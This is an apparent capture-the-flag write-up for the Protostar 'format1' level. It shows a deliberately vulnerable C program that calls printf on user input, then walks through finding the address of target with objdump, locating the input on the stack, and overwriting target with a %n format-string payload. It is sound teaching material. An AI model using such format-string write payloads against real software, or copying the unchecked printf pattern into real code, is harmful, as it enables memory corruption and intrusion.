# Protostar - Format 1

### About ###

>This level shows how format strings can be used to modify arbitrary memory locations.
>
>**Hints**
>
> - objdump -t is your friend, and your input string lies far up the stack :)
> - This level is at /opt/protostar/bin/format1




### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

### Solution 

Format strings can be used to change values at arbitrary locations in the memory of a process.
Here we want to change the variable target, the first step is to find its address, we can use `objdump -t` to do that.

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/format1 | grep target
08049638 g     O .bss  	00000004              target
```

To change a value with a format string we are going to use the conversion character `%n` which returns the number of character printed since the call of the format string based function.

The following c program is a bit more specific. It prints the characters `abcd` then stored the number of characters printed into the variable `addr`.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
       	int addr = 0;
       	printf("abcd%n\n", &addr);
       	printf("[+] Value of addr = %d\n", addr);
       	return 0;
}
```
```
user@protostar:/tmp$ gcc -o test test.c; ./test
abcd
[+] Value of addr = 4
```

Changing values at arbitrary locations is the same thing. We specifiy an address in the format string and then we write into it with `%n`.

We have control over the variable `argv[1]`, but before exploiting the format string we need to find where it is stored on the stack. To display arbitrary values from the stack, we can use `%num$x` where `num` is the offset from the top of the stack. So, if we want the third element from the top of the stack, we will use `%2$x`.

In order to find the location of `argv` we are going to iterate over the 200 first elements of the stack until we find out pattern `ABCDEFGH` (`0x4142434445464748` in ASCII).

```
user@protostar:/tmp$ for i in $(seq 1 200); do echo $i; format1 $(python -c "print 'ABCDEFGH.%$i\$x'"); echo; done;
1
ABCDEFGH.804960c
2
ABCDEFGH.bffff6a8
3
ABCDEFGH.8048469
[...]
130
ABCDEFGH.42410031  <-+--- Our pattern
131                  |
ABCDEFGH.46454443  <-+
132                  |
ABCDEFGH.252e4847  <-+
[...]
```

The value `0x46454443` at the offset 131, which is the ASCII code of `CDEF`, was written with the format string `ABCDEFGH.%131$x`. To flag this challenge, we only need to replace `CDEF` by the address of `target` and `%131$x` by `%131$n`.

We can now rewrite the value of `target` with the following format string:
```
AB\x38\x96\x04\x08GH.%131$n
``` 

```
user@protostar:/tmp$ format1 $(python -c "print 'AB\x38\x96\x04\x08GH.%131\$n'")
AB8GH.you have modified the target :)
```